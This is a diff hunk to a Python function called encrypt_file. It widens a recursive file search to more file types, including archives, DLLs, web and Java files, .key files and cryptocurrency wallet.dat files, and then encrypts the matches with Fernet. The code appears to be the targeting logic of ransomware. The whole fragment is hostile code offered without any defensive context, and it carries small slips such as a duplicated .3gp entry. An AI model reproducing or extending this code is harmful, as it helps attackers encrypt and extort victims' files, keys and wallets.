@@ -36,7 +36,25 @@ def encrypt_file():
                 + glob.glob(path + '/**/*.wav', recursive=True) \
                 + glob.glob(path + '/**/*.mp3', recursive=True) \
                 + glob.glob(path + '/**/*.mp4', recursive=True) \
-                + glob.glob(path + '/**/*.3gp', recursive=True):
+                + glob.glob(path + '/**/*.3gp', recursive=True) \
+                + glob.glob(path + '/**/*.iso', recursive=True) \
+                + glob.glob(path + '/**/*.ico', recursive=True) \
+                + glob.glob(path + '/**/*.lnk', recursive=True) \
+                + glob.glob(path + '/**/*.ink', recursive=True) \
+                + glob.glob(path + '/**/*.xls', recursive=True) \
+                + glob.glob(path + '/**/*.dll', recursive=True) \
+                + glob.glob(path + '/**/*.html', recursive=True) \
+                + glob.glob(path + '/**/*.gz', recursive=True) \
+                + glob.glob(path + '/**/*.css', recursive=True) \
+                + glob.glob(path + '/**/*.js', recursive=True) \
+                + glob.glob(path + '/**/*.3gp', recursive=True) \
+                + glob.glob(path + '/**/*.key', recursive=True) \
+                + glob.glob(path + '/**/wallet.dat', recursive=True) \
+                + glob.glob(path + '/**/*.tar', recursive=True) \
+                + glob.glob(path + '/**/*.tgz', recursive=True) \
+                + glob.glob(path + '/**/*.rar', recursive=True) \
+                + glob.glob(path + '/**/*.java', recursive=True):
+
             k = key
             f = Fernet(k)
             try:
